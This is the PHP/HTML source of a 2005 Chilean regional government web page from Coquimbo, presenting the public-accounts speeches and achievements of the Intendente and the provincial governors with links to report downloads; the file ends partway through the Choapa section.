<?php
global $c;
function ctacab() {
global $c;?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<title>Cuenta P&uacute;blica 2005 - Gobierno Regional de Coquimbo</title>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
<link rel="stylesheet" href="css/ctapub04.css" type="text/css" media="screen" />
</head>

<body id="home">
<div id="wrap"> 
  <p id="theme"></p>
  <div id="logo"></div>
  <div id="title"> 
    <h1>... hacia una nueva regi&oacute;n de coquimbo &nbsp;&nbsp;&nbsp;</h1>
    <!--<h2>texto dentro de este apartado enunciado</h2>-->
  </div>
  <?php
}	
	


function ctamenu() { 
global $c;?>
  <hr class="hide" />
  <div id="sidebar"> 
    <!-- lado derecho -->
    <h3>Men&uacute; Navegaci&oacute;n</h3>
    <ul id="quickbits">
      <li> <a href="<?php $PHP_SELF ?>?c=p" title="Cuenta P&uacute;blica Intendente Felipe del R&iacute;o Goudie.  "> 
        Gesti&oacute;n Gobierno Regional </a> </li>
      <li> <a href="<?php $PHP_SELF ?>?c=e" title="Cuenta P&uacute;blica Gobernadora Provincial de Elqui.  "> 
        Gesti&oacute;n Provincia de Elqui </a> </li>
      <li> <a href="<?php $PHP_SELF ?>?c=l" title="Cuenta P&uacute;blica Gobernador Provincia de Limar&iacute;.  "> 
        Gesti&oacute;n Provincia de Limar&iacute; </a> </li>
      <li><a href="<?php $PHP_SELF ?>?c=c" title="Cuenta P&uacute;blica Gobernador Provincia de Choapa.  ">
        Gesti&oacute;n Provincia de Choapa</a>
      </li>
	  
		<hr />
		<li><a href="cta04.php" title="Cuenta P&uacute;blica Gesti&oacute;n 2004  ">
        Cuenta P&uacute;blica Gesti&oacute;n 2004</a>
      </li>	  
    </ul>
    <h3>Descargas</h3>
    <ul id="quickbits">
      <?php if ( $c == "p" || !isset($c) ) { ?>
      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/cta06intendente.pdf" title="Descargar Discurso Intendente. Documento PDF [78 KB]  " class="more" target="_blank">Discurso Intendente [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icword.png" border="0"/>&nbsp;<a href="descargas/cta06intendente.doc" title="Descargar Discurso Intendente. Documento WORD [55 KB]  " class="more" target="_blank">Discurso Intendente [versi&oacute;n DOC]</a> </li>
	  <br />
	  
      <?php }
	  
if ($c == "e") { ?>
      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/cta05elqui.pdf" title="Descargar Discurso Gobernador Provincial de Elqui. Documento PDF [0.11 MB]  " class="more" target="_blank">Discurso Gobernador [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icword.png" border="0"/>&nbsp;<a href="descargas/cta05elqui.doc" title="Descargar Discurso Gobernador Provincial de Elqui. Documento WORD [87 KB]  " class="more" target="_blank">Discurso Gobernador [versi&oacute;n DOC]</a> </li>

      <?php }

if ($c == "l") { ?>
      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/cta05limari.pdf" title="Descargar Discurso Gobernador Provincial de Limari. Documento PDF [0.11 MB]  " class="more" target="_blank">Discurso Gobernador [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icword.png" border="0"/>&nbsp;<a href="descargas/cta05limari.doc" title="Descargar Discurso Gobernador Provincial de Limari. Documento WORD [0.12 MB]  " class="more" target="_blank">Discurso Gobernador [versi&oacute;n DOC]</a> </li>
      <?php } 

if ($c == "c") { ?>
      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/cta05choapa.pdf" title="Descargar Discurso Gobernadora Provincial de Choapa. Documento PDF [54.74 KB]  " class="more" target="_blank">Discurso Gobernadora [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icword.png" border="0"/>&nbsp;<a href="descargas/cta05limari.doc" title="Descargar Discurso Gobernadora Provincial de Choapa. Documento WORD [48 KB]  " class="more" target="_blank">Discurso Gobernadora [versi&oacute;n DOC]</a> </li>
      <?php } ?>
	  
	  
    </ul>
	
<?php

      if ( $c == "p" || !isset($c) ) { ?>
    <h3>Otras Descargas</h3>
    <ul id="quickbits">
      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/gore/balgaspro01.pdf" title="Descargar documento PDF [0.13 MB]  " class="more" target="_blank">Balance Ejecuci&oacute;n Presupuestaria 2005 Programa 01 [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icexcel.png" border="0"/>&nbsp;<a href="descargas/gore/balgaspro01.xls" title="Descargar documento EXCEL [86.50 KB]  " class="more" target="_blank">Balance Ejecuci&oacute;n Presupuestaria 2005 Programa 01 [versi&oacute;n EXCEL]</a> </li>
		<hr />

      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/gore/balgaspro02.pdf" title="Descargar documento PDF [0.13 MB]  " class="more" target="_blank">Balance Ejecuci&oacute;n Presupuestaria 2005 Programa 02 [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icexcel.png" border="0"/>&nbsp;<a href="descargas/gore/balgaspro02.xls" title="Descargar documento EXCEL [86.50 KB]  " class="more" target="_blank">Balance Ejecuci&oacute;n Presupuestaria 2005 Programa 02 [versi&oacute;n EXCEL]</a> </li>
		<hr />

      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/gore/ctages05.pdf" title="Descargar documento PDF [0.23 MB]  " class="more" target="_blank">Cuenta Anual Gesti&oacute;n 2005 [versi&oacute;n PDF]</a> </li>
		<hr />
		

      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/gore/propir06.pdf" title="Descargar documento PDF [0.46 MB]  " class="more" target="_blank">PROPIR 2006 Regi&oacute;n de Coquimbo [versi&oacute;n PDF]</a> </li>
		
		<hr />
		

      <li> <img src="../imagenes/icpdf.png" border="0"/>&nbsp;<a href="descargas/gore/segproCMR.pdf" title="Descargar documento PDF [88.09 KB]  " class="more" target="_blank">Seguimiento Iniciativas de Inversi&oacute;n [versi&oacute;n PDF]</a> </li>
      <li> <img src="../imagenes/icexcel.png" border="0"/>&nbsp;<a href="descargas/gore/segproCMR.xls" title="Descargar documento EXCEL [72 KB]  " class="more" target="_blank">Seguimiento Iniciativas de Inversi&oacute;n [versi&oacute;n EXCEL]</a> </li>

	</ul>
<?php } ?>


	<div>&nbsp;</div>
	<div align="center"><a href="http://www.adobe.com/es/products/acrobat/readstep2.html" target="_blank"><img src="imagenes/get_adobe_reader.gif" border="0" /></a></div>
	
  </div>
  <!-- end #sidebar -->
  <?php 
}


  
function ctapie() { 
global $c;?>
  <hr class="hide"/>
  <div id="footer"> 
    <p><strong>www.gorecoquimbo.cl</strong>: Gobierno Regional de Coquimbo. Desarrollado 
      por:<a href="mailto:ljimenez@gorecoquimbo.cl">Luis Jim&eacute;nez Villalobos</a>.</p>
  </div>
</div>
<!-- end #wrap -->
<br />
<!-- Begin Nedstat Basic code -->
<!-- Title: Cuenta P�blica 2004 -->
<!-- URL: http://www.gorecoquimbo.cl/cuenta/index.php -->
<script language="JavaScript" type="text/javascript" src="http://m1.nedstatbasic.net/basic.js">
</script>
<script language="JavaScript" type="text/javascript" >
<!--
  nedstatbasic("ADXH2wKkN/0uS+aDlVwB5r1KXVWw", 0);
// -->
</script>
<noscript>
<a target="_blank" href="http://www.nedstatbasic.net/stats?ADXH2wKkN/0uS+aDlVwB5r1KXVWw"><img
src="http://m1.nedstatbasic.net/n?id=ADXH2wKkN/0uS+aDlVwB5r1KXVWw"
border="0" width="18" height="18"
alt="Nedstat Basic - Web site estad�sticas gratuito
El contador para sitios web particulares"></a><br>
<a target="_blank" href="http://www.nedstatbasic.net/">Contador gratuito</a>
</noscript>
<!-- End Nedstat Basic code -->
</body>
</html>
<?php } 


if ( ( !$HTTP_GET_VARS[c] ) || ( $HTTP_GET_VARS[c] == "p" ) ) {
global $ses, $Nniv;
ctacab();
?>
  <div id="main-body"> 
    <div id="content">

      <h2 id="recent">Gesti&oacute;n P&uacute;blica 2005:</h2>
      <h1>�CREATIVIDAD, EFICIENCIA Y GESTI�N�, FUE EL LLAMADO DEL INTENDENTE EN LA CUENTA P�BLICA 2005</h1>
      <!--<p align="center"><img src="imagenes/ctachile.gif" alt="" title="Logo de Chile" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
        <img src="imagenes/cta04.jpg" alt="" title="Logo Cuenta P&uacute;blica 2004" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
        <img src="imagenes/ctagore.gif" alt="" title="Logo Gobierno Regional de Coquimbo" /></p>-->
      <p class="encabezado"> Intendente Ricardo Cifuentes Lillo, en sesi�n ordinaria del Consejo Regional, y frente a diversas autoridades regionales y representantes de la comunidad, dio cuenta del desarrollo alcanzado por la regi�n de Coquimbo durante el a�o pasado.</p>

		<p><img src="imagenes/cta05.jpg"  style="padding:4px;border:1px solid #ddd;" hspace="5" vspace="5"/></p>

<p class="normal">Tal como lo establece el art�culo 26 de la Ley 19.175 sobre Gobierno y Administraci�n Regional, el Intendente Ricardo Cifuentes, entreg� a la comunidad los logros alcanzado durante el 2005 y las proyecciones  establecidas para la regi�n al Bicentenario.</p>
	  
<p class="normal">En el Sal�n Vicu�a de la casa de Gobierno Regional, el Intendente, dijo valor� el desarrollo del pa�s alcanzado en los diecis�is a�os de Gobierno de la Concertaci�n,  y llam� a los habitantes de la regi�n de Coquimbo a �construir en conjunto�, marcado con ello los principales lineamiento que tendr� la Estrategia de Desarrollo al 2020.</p>

<p class="normal">El Intendente Ricardo Cifuentes se�al� al respecto cinco criterios b�sicos fundamentales para el desarrollo del Gobierno y la comunidad en los pr�ximos a�os. �Debemos desarrollar una gesti�n creativa y con eficiencia, capaz de guiar y orientar esa gesti�n con mirada regional. Debemos actuar con sentido pol�tico, responder a la comunidad con orientaciones claras, precisas, posibles  y estrat�gicas. Debemos creer en nuestra gente, y aqu�, la institucionalizad, representada en sus profesionales, t�cnicos, y funcionarios, es un recurso de primer nivel que debemos optimizar. Debemos incorporar activamente a la sociedad civil al accionar del Gobierno, y ser proactivos en las acciones que cada uno debemos desempe�ar. Y finalmente entre las autoridades de gobierno y del sector p�blico,  debe existir  y primar una vocaci�n por los acuerdos y a la vez una visi�n de Regi�n basada en el   Construir en Conjunto�, subray�.</p>

<p class="normal">Junto con ello, reconoci� la Gesti�n 2005, especialmente en la figura del ex Intendente Felipe del R�o, los consejeros regionales, Seremis, Directores de Servicio y funcionarios p�blicos de la gesti�n anterior.</p>

<p class="normal">Sobre esta base Ricardo Cifuentes mencion� los principales logros del a�o pasado, que han permitido generar �este clima de entendimiento y trabajo en equipo, que se ha transformado en una fortaleza insustituible de nuestro territorio�, asever�.</p>

<p class="normal">Fue as� que destac� los logros obtenidos en el plano del Desarrollo Econ�mico y Fomento Productivo, donde enfatiz� las cifras en empleo, que el a�o 2005 aumentaron a  14.340  nuevos puestos de trabajo. Esto se suma a las cifras entregadas por SENCE que dan cuenta de 40.349 personas capacitadas durante el 2005, con una inversi�n que super� los 3.890 millones de pesos. Esto permiti� generar 5.425 personas empleos.</p>

<p class="normal">Otro hito econ�mico resultaron ser las exportaciones. Estas crecieron respecto del a�o 2004, en un 40%.  Este aumento se explica en gran medida por la producci�n minera del cobre, complementado con la exportaci�n agr�cola y de productos del mar. Lo que en el per�odo 2004-2005, representa 1.800 millones de d�lares.</p>

<p class="normal">En materia agr�cola,  el Intendente subray� que en el 2005 se concluy�  un per�odo de cinco a�os, con un aumento del 25% de las exportaciones. En tanto, en el sector acu�cola, relev� la consolidaci�n de la superficie en hect�reas cultivadas, lo que represent� entre otros  aspectos, generar  un  67%  de la producci�n nacional de ostiones. Finalmente, en el �mbito tur�stico, Ricardo Cifuentes destac� que el a�o pasado se consolid� la llegada de personas a la zona,  con el arribo de 600 mil visitas durante el per�odo estival, lo que evidencia a este sector como un pilar importante del desarrollo regional.</p>

<p class="normal">En cuanto al apoyo a la micro, peque�a  y mediana empresa, se recalc� en la Cuenta P�blica,  el pr�stamo gestionado por CORFO, a trav�s de su Gerencia de Intervenci�n Financiera, a la Cooperativa Agr�cola Pisquera Elqui (CAPEL),  para transformar a �sta en una instituci�n financiera no bancaria, que otorga micro cr�ditos a sus cooperados. Similar acci�n se llev� a cabo con la Cooperativa Agr�cola Control Pisquero de Elqui y  Limari, por un monto de 600 millones de pesos.</p>

<p class="normal">En tanto, tres fondos concursables entre el Programa M�s Regi�n y SERCOTEC, lograron beneficiar a 92 microempresarios.</p>

<p>&nbsp;</p>

<p class="normal"><strong>DESARROLLO SOCIAL</strong><br />
Los avances en equidad social logrados en la gesti�n 2005, quedaron demostrados en los logros obtenidos en salud, educaci�n, vivienda y aquellas destinadas a la mujer, j�venes y ni�os un avance sustancial.</p>

<p class="normal">En el plano de la salud, se acentu� la inversi�n que super�  los 2.500  millones de pesos.  En educaci�n, fue relevante el aumento de la cobertura en educaci�n parvularia, superando en un 111% la meta establecida para el a�o pasado. En tanto, para la Jornada Escolar Completa, se indic� que 18  nuevas escuelas y liceos, integrando a diez mil nuevos alumnos a esta modalidad.</p>

<p class="normal">En vivienda, uno de los �mbitos prioritarios del Gobierno, se entregaron 4.963 subsidios, lo que signific� una inversi�n de 17 mil millones de pesos. Junto con ello, en pavimentos participativos fueron favorecieron a 101 proyectos, con una inversi�n de 2.900  millones de pesos.</p>

<p class="normal">En el marco de las pol�ticas de g�nero, 3.725 mujeres fueron beneficiadas con programas de capacitaci�n y financiamiento para peque�os emprendimientos. Iniciativas apoyadas por FOSIS, SERCOTEC, PRODEMU, SERNAM, M�s Regi�n y el Programa Chile Barrios, entre otros.</p>

<p class="normal">Con relaci�n al desarrollo de la Infancia, uno de los grupos prioritarios de apoyo del Gobierno, se estableci� durante el 2005 un programa de extensi�n horaria. �Esto permiti� la atenci�n de 100 ni�os atendidos el  2004, a 409 p�rvulos atendidos el  2005�, afirm� el Intendente.</p>

<p class="normal">Especial hincapi� se realiz� en el combate al consumo de drogas, esfuerzos que se han traducido en el apoyo al tratamiento y rehabilitaci�n, permitiendo la atenci�n de 342 personas el 2005. En este per�odo se creo tambi�n el primer Centro de Tratamiento Residencial para la poblaci�n Infanto -  Adolescente.</p>

<p class="normal">En la lucha por la superaci�n de la pobreza el Programa Chile Solidario beneifici� a 6.764 familias durante el 2005. De igual forma se ha avanzado en la focalizaci�n de la pobreza, para reorientar la inversi�n p�blica y as� enfrentar y combatir de manera m�s efectiva este flagelo.</p>

<p class="normal">En materia de seguridad ciudadana el Intendente Cifuentes destac� el aporte realizado por el Gobierno Regional para la adquisici�n de equipamiento policial, entre ellos, 48 veh�culos policiales, por un monto de 480 millones de pesos. �En esta misma dimensi�n la implementaci�n del Plan Cuadrante durante este a�o 2006, permitir� una mejor dotaci�n de Carabineros, lo que ir� acompa�ado de mayor infraestructura y mayor equipamiento, con una inversi�n que alcanzar� los 3.400 millones de pesos�, relev� el Intendente.</p>

<p>&nbsp;</p>
<p class="normal"><strong>INFRAESTRUCTURA</strong><br />
En cuanto a las obras de infraestructura que se encuentran ejecutadas y que ya est�n siendo utilizadas por la comunidad, el Intendente enfatiz� en la remodelaci�n de la Caleta Pesquera de Pe�uelas; el mejoramiento vial, camino interior que une Combarbal� y Cogot� 18; el paso superior 4 esquinas en la Ruta 5 Norte; la continuaci�n de la Av. Costanera que une de manera definitiva las playas de  Coquimbo y La Serena; y la construcci�n del Centro de Salud Pedro Aguirre Cerda de La Antena que pronto entrar� en funcionamiento.</p>

<p class="normal">�Estas obras que en su conjunto superan los 4.500 millones de pesos de inversi�n, representan y conllevan un importante impacto social, productivo y econ�mico. Estas obras significan un inmenso aporte para el crecimiento de la Regi�n de Coquimbo�, manifest� el Intendente.</p>

<p class="normal">En la cuenta tambi�n se destac� la construcci�n y puesta en funcionamiento del Centro de Reclusi�n Penitenciaria de Huachalalume; y cinco grandes obras de infraestructura que significar�n un gran aporte para el desarrollo de la Regi�n. Entre ellas, el Puerto Pesquero Artesanal de Coquimbo, la Comisar�a de Las Compa��as, proyecto emblem�tico y anhelado por la comunidad de ese sector; el abovedamiento del Canal Romeral de Ovalle; proyectos de instalaci�n de Agua Potable Rural, en distintas comunas de la regi�n; y la construcci�n definitiva del Puente Vicente Zorrilla.</p>

<p class="normal">�Estas obras en su conjunto alcanzan una inversi�n que supera los 17 mil millones de pesos, y beneficiar�n a mas de cuatrocientas mil personas de la Regi�n de Coquimbo�, indic�  finalmente el Intendente.</p>

<p>&nbsp;</p>
<p class="normal">Al concluir el evento, el Intendente extendi� una copia de la Gesti�n del Gobierno Regional a cada uno de los consejeros y adem�s, junto a los presidente de cada Comisi�n del CORE, subi� la Cuenta P�blica 2005 a Internet, en un acto de transparencia y eficiencia del servicio p�blico. Esta se encuentra disponible en la p�gina web www.gorecoquimbo.cl</p>
<p></p>
      <!--<p class="note">No existen notas al caso</p>-->
    </div>
    <!-- end #content -->
  </div>
  <!-- end #main-body -->
<?php
ctamenu();
ctapie();
}



if (($HTTP_GET_VARS[c] == "l" ) ) {
global $ses, $Nniv;
ctacab();
?>
  <div id="main-body"> 
    <div id="content">
<h2 id="recent">Gesti&oacute;n P&uacute;blica 2005:</h2>
      <h1>CON UN LLAMADO AL COMPROMISO DE LOS SERVICIOS P�BLICOS GOBERNADOR DE LIMARI ENTREGA CUENTA P�BLICA 2005</h1>
	  <p class="encabezado">Con asistencia de autoridades Regionales, Provinciales y Comunales, adem�s de dirigentes de organizaciones sociales y p�blico en General, se llev� a efecto en la Gobernaci�n Provincial de Limar� la Cuenta P�blica de la Gesti�n 2005 y la exposici�n de la Agenda Tem�tica 2005.</p>	
	  
<p><img src="imagenes/cta05limari.jpg" style="padding:4px;border:1px solid #ddd;" hspace="5" vspace="5" alt="" title=" Cuenta P&uacute;blica Gobernaci&oacute;n Provincial de Limar&iacute;  "/></p>

      <p class="normal">En la ocasi�n los Jefes de los Comit�s de: Desarrollo Humano y Social, Infraestructura y Territorio e Innovaci�n y Desarrollo Productivo,  Sra. Juana Vasquez, Eduardo Plaza y Sr. Claudio Pinto, respectivamente, dieron cuenta de los logros de la gesti�n 2005 de los distintos servicios p�blicos que los componen.</p>
	  
       <p class="normal">Luego de las exposiciones indicadas, el Gobernador de Limar� Sr. Iv�n Hern�ndez Gentina, expuso los principales aspectos de la Agenda Tem�tica 2006.   �Esta agenda est� basada en las cinco �reas tem�ticas que reflejan las prioridades del Gobierno de nuestra Presidenta, he dise�ado para el a�o 2006, una Agenda de Trabajo, que incluyendo las 36 medidas a aplicar en los primeros 100 d�as de Gobierno,  el dise�o de una Estrategia de Desarrollo Provincial, que formar� parte de un dise�o Regional, los compromisos de todos los SSPP y los productos estrat�gicos que corresponde entregar a la Gobernaci�n, constituyen desde ya nuestro compromiso de gesti�n, con la comunidad de la Provincia�, manifest� la primera autoridad provincial.</p>

<p class="normal">El desaf�o que nos espera para este a�o es importante y motivador.  Para ello cuento con el compromiso de todos los funcionarios p�blicos de la provincia, los que asumimos este desaf�o con optimismo, alegr�a y con la certeza de que estamos aportando de manera efectiva y concreta al logro del Plan de Gobierno de la Presidenta Bachelet y por ende al mejoramiento de las condiciones de vida de todos los habitantes de esta provincia, termin� diciendo el Jefe Provincial.</p>

<p></p>
      <!--<p class="note">No existen notas al caso</p>-->
    </div>
    <!-- end #content -->
  </div>
  <!-- end #main-body -->
<?php
ctamenu();
ctapie();
}



if (($HTTP_GET_VARS[c] == "e" ) ) {
global $ses, $Nniv;
ctacab();
?>
  <div id="main-body"> 
    <div id="content">
<h2 id="recent">Gesti&oacute;n P&uacute;blica 2005:</h2>
      <h1>Gobernador de Elqui Rolando Calder�n Rindi� Su Cuenta P�blica</h1>
<p class="encabezado">La provincia de Elqui durante el 2005 avanz� en termas como la Seguridad Ciudadana a trav�s del Programa Barrio M�s Seguro, Comuna M�s Segura y la creaci�n del nuevo Comit� de Seguridad P�blica.</p>
<p class="encabezado">Adem�s durante ese a�o se realiz� el II Foro de Corredor Bioce�nico Central donde se discutieron temas concernientes al paso Aguas Negras.</p>
<p class="encabezado">Uno de los �nfasis del gobernador Calder�n para el presente a�o es la participaci�n ciudadana.</p>

<p><img src="imagenes/cta05elqui.jpg" style="padding:4px;border:1px solid #ddd;" hspace="5" vspace="5" alt="" title=" Cuenta P&uacute;blica Gobernaci&oacute;n Provincial de Elqui  "/></p>


<p class="normal">La Sede de la Junta de Vecinos N� 10 Llano Virgilio en Coquimbo, fue el lugar elegido por el Gobernador Provincial de Elqui, Rolando Calder�n Aranguiz para dar a conocer los logros y principales hitos de la Gobernaci�n durante la gesti�n 2005.</p>

<p class="normal">Tomando como eje principal los temas de Seguridad Ciudadana y el Paso agua Negra, Calder�n manifest� que la provincia debe conocer lo realizado para continuar con claridad hacia el  futuro y de ese modo asumir los desaf�os que se vienen por  delante.</p>

<p class="normal">La m�xima autoridad provincial se�al� que uno de los principales logros de la Gobernaci�n durante el a�o 2005 es la inversi�n realizada para mejorar la seguridad de sus ciudadanos, esto se logr� a trav�s del programa Barrio m�s Seguro, que lleva tres a�os de funcionamiento con satisfactorios resultados en la provincia, focalizando su accionar en los sectores de Tierras Blancas, Las Compa��as y el a�o pasado en la poblaci�n Juan XXIII de la Antena. Es en este �ltimo  lugar donde se han materializado dos proyectos a cargo de la Junta de vecinos N� 1 San Francisco con una inversi�n total cercana a los 25 millones de pesos del Fondo Presidente de la Rep�blica.</p>

<p class="normal">Calder�n agreg� que gracias a este fondo tambi�n se desarrollaron otros tres proyectos ejecutados en los sectores de Villa Lambert, Los Llanos y Villa El Romero de la comuna de La Serena.</p>

<p class="normal">Otros de los instrumentos enumerados por la autoridad para combatir la delincuencia en conjunto con los vecinos son los di�logos permanentes sostenidos en terreno con las polic�as, Municipios, servicios p�blicos y SEREMIS adem�s de una activa participaci�n en el programa Comuna m�s Segura que se encuentra en implementaci�n en las comunas de La Serena y Coquimbo.</p>

<p class="normal">Inform� adem�s, que la Gobernaci�n de Elqui form� un grupo de trabajo de seguridad p�blica en el transporte colectivo menor, acogiendo el planteamientos expuesto por los gremios de la actividad. Durante el 2005 se  transfiri� un mapa con soporte inform�tico que permiti� georreferenciar los sectores seg�n peligrosidad.</p>

<p>&nbsp;</p>
<p class="normal"><strong>Agua Negra</strong><br />
En Cuanto a los comit�s de frontera para el paso Agua Negra, el Gobernador Calder�n se�al� que desde el a�o pasado estas instancias pasaron a llamarse �Comit�s de Integraci�n� que tienen como finalidad el acercamiento con Argentina. La autoridad inform� en esta materia que el a�o pasado se constituy� la comisi�n permanente de alcaldes e intendentes y se firm� el acuerdo de San Juan suscrito por las autoridades de la �poca; alcaldes; consejeros regionales; trabajadores y diputados.</p>

<p class="normal">Del mismo modo se refiri� a la realizaci�n del  II Foro Corredor Bioce�nico Central que se realiz� a fines del a�o y que cont� con la presencia de Parlamentarios de la regi�n centro de Argentina. En la ocasi�n se tomaron importantes acuerdos como realizar acciones conducentes a la creaci�n de una secretar�a ejecutiva. Tambi�n la creaci�n de una Comisi�n P�blico Privada Econ�mica, formada por representantes de las regiones, provincias y estados miembros del Corredor Bioce�nico Central.</p>

<p class="normal">Otro de los logros importantes en pos de la integraci�n ocurridos durante la gesti�n 2005 es la remodelaci�n del Complejo Fronterizo Juntas del Toro, con una inversi�n superior a 450 millones de pesos, lo cual lo ubica entre los m�s modernos del pa�s.</p>

<p>&nbsp;</p>
<p class="normal"><strong>Inversiones</strong><br />
En la Cuenta 2006, el Gobernador de Elqui tambi�n se�al� los avances y apoyo al empresariado provincial, a trav�s de proyectos dependientes de CORFO, Sercotec e INDAP que ayud� a pescadores artesanales, peque�os y mediano agricultores, peque�os y medianos empresarios, entre otros, en aspectos tecnol�gicos, de infraestructura o para contrataci�n de mano de obra. Calder�n puso �nfasis en que todas estas medidas  �han sido reales ayudas para nuestra gente; el emprendimiento lo han vivido j�venes y adultos, ya sea en proyectos colectivos o individuales�.</p>


<p>&nbsp;</p>
<p class="normal"><strong>Infraestructura</strong><br />
Calder�n tambi�n puso �nfasis en los avances estructurales en la provincia, obras como la construcci�n del puerto pesquero artesanal de Coquimbo, que dar� un espacio f�sico que facilitar� las labores asociadas al mar y entregar� un agregado tur�stico al sector se encuentra en ejecuci�n. Tambi�n se�al� obras viales como los caminos de acceso a Las Cardas, las barrancas y Algarrobito, y los caminos Vicu�a-Hurtado, Islon-Las Rojas-Pel�cana e Islon �El Romero-Lambert con una inversi�n total superior a los M$27.500 y que son parte de las gestiones realizadas por el gobierno provincial el 2005.</p>


<p>&nbsp;</p>
<p class="normal"><strong>Social</strong><br />
Dentro de los programas de la gobernaci�n est� la ayuda a los adultos mayores a trav�s de proyectos del SENAMA, el 2005 este fondo benefici� 42 iniciativas para mejorar la calidad de vida de los mayores de 60 a�os con una inversi�n que super� los $28 millones. Calder�n record� que para la Gobernaci�n el bienestar de los adultos mayores es fundamental, es por ello que el a�o 2005 se realiz� una jornada recreativa llamada �Vive la vida, toda la vida�, en conjunto con el SENAMA y la SEREMI de gobierno y que agrup� a m�s de mil adultos mayores de las seis comunas de nuestra provincia.</p>


<p class="normal">Enmarcado en la ayuda que se presta al sector rural, el Gobernador se�al� que el a�o pasado se continu� apoyando y asesorando en el fortalecimiento de organizaci�n en el  sector caprino, ya que se logr� consolidar la conformaci�n de 66 organizaciones locales de crianceros. Adem�s se benefici� a 566 personas con bonos compensatorios del Programa de Prevenci�n de la Fiebre Aftosa con una inversi�n de m�s de 23 millones de pesos.</p>

<p class="normal">Finalmente Calder�n agradeci� a los servicios que a nivel provincial ayudan a mejorar la calidad humana y de vida de sus habitantes entregando educaci�n, implementos t�cnicos, capacitaciones rehabilitaci�n, becas, entre otros servicios fundamentales para seguir adelante incluyendo instancias recreativas y culturales, con lo que se logra integrar a la comunidad y evitar las exclusiones.</p>

<p></p>
      <!--<p class="note">No existen notas al caso</p>-->
    </div>
    <!-- end #content -->
  </div>
  <!-- end #main-body -->
<?php
ctamenu();
ctapie();
}


if (($HTTP_GET_VARS[c] == "c" ) ) {
global $ses, $Nniv;
ctacab();
?>
  <div id="main-body"> 
    <div id="content">
<h2 id="recent">Gesti&oacute;n P&uacute;blica 2005:</h2>
      <h1>GOBERNADORA DEL CHOAPA RINDE CUENTA PUBLICA GESTION 2005</h1>
	  <p class="encabezado">Comisiones T�cnicas Asesoras, se encargaron de entregar los resultados del 2005. diversas obras de infraestructura ejecutadas durante ese periodo destacaron por el alto beneficio social sobre la poblaci�n del Choapa.</p>	
	  
<p><img src="imagenes/cta05choapa.jpg" style="padding:4px;border:1px solid #ddd;" hspace="5" vspace="5" alt="" title=" Cuenta P&uacute;blica Gobernaci&oacute;n Provincial de Choapa  "/></p>

      <p class="normal">Bajo una modalidad distinta, el Gobierno Provincial del Choapa, entrego su cuenta publica gesti�n 2005. En esta oportunidad, los presidentes de las comisiones �Desarrollo Humano�, �Fomento Productivo�, �Territorio e Infraestructura� y �Modernizaci�n�, rindieron cuenta sobre los logros de cada servicio en materia de inversi�n p�blica, programas y pol�ticas aplicadas, y el creciente numero de beneficiarios, muchos de los cuales se encontraban presentes y fueron motivo de espont�neos aplausos.</p>
	  
       <p class="normal">Ante un numero superior a las doscientas personas, entre ellos Alcaldes, Concejales, el ex Gobernador Luis Figueroa, dirigentes, estudiantes, beneficiarios, y jefes de servicios p�blicos, la Gobernadora del Choapa quiso en esta oportunidad matizar su discurso con la poes�a de Benedetti, la cual versa sobre la necesidad de conocerse y establecer di�logos permanentes, fue as� que introdujo a los asistentes a la clara misi�n y objetivos de una Gobernaci�n, especialmente sobre asegurar el orden publico, resguardar y afianzar la seguridad ciudadana, aplicar a cabalidad la gesti�n territorial e informar a la ciudadan�a y otorgar cuando sea el caso, los beneficios del Gobierno.</p>

<p class="normal">Concluida su participaci�n, se inicio la cuenta publica de la Comisi�n de �Desarrollo Humano�, integrada por mas de once servicios del �rea social, educacional y de prevenci�n, cuenta que estuvo a cargo de su presidente y Jefe Provincial de Educaci�n Choapa Jorge Villarroel.</p>

<p>&nbsp;</p>
<p class="normal"><strong>OTORGANDO SONRISAS</strong><br />
Mauricio C�ceres, Elizabeth Castillo y Melanie Catalado, son j�venes estudiantes de liceos de la comuna de Illapel que recibieron durante el a�o pasado la Beca de Retenci�n Liceo para Todos, ellos son ejemplo de la gama de programas sociales aplicados por el Gobierno, bajo mandato del ex Presidente Ricardo Lagos.</p>

<p class="normal">El trabajo de la comisi�n de �Desarrollo Humano� quiso reflejar en su exposici�n que desde el nacimiento del hombre hasta su vejez, recibe apoyo de las pol�ticas p�blicas del Gobierno, dando cuenta por ejemplo que JUNJI logro durante el 2005 la atenci�n  integral de calidad a P�rvulos de  3 meses a 5 a�os 11 meses, principalmente de sectores pobres a nivel urbano y rural, e implementando cinco jardines infantiles cl�sicos en cada una de las comunas con atenci�n a 656 p�rvulos, as� tambi�n se implementaron 32 jardines infantiles familiares en diferentes  sectores rurales en Illapel, Canela, Los Vilos y Salamanca con una atenci�n de 733 ni�os y ni�as.</p>

<p class="normal">Mientras que uno de los logros mas significativos, fue la implementaci�n de la reforma de la educaci�n parvularia  con capacitaci�n a cien funcionarios profesionales y t�cnicos.</p>

<p class="normal">Concretamente, en el �mbito educacional, resaltaron las inversiones en Jornada Escolar Completa, incorporando siete establecimientos educacionales con un gasto de $1.614.000 lo que permiti� beneficiar directamente a 1736 alumnos.</p>

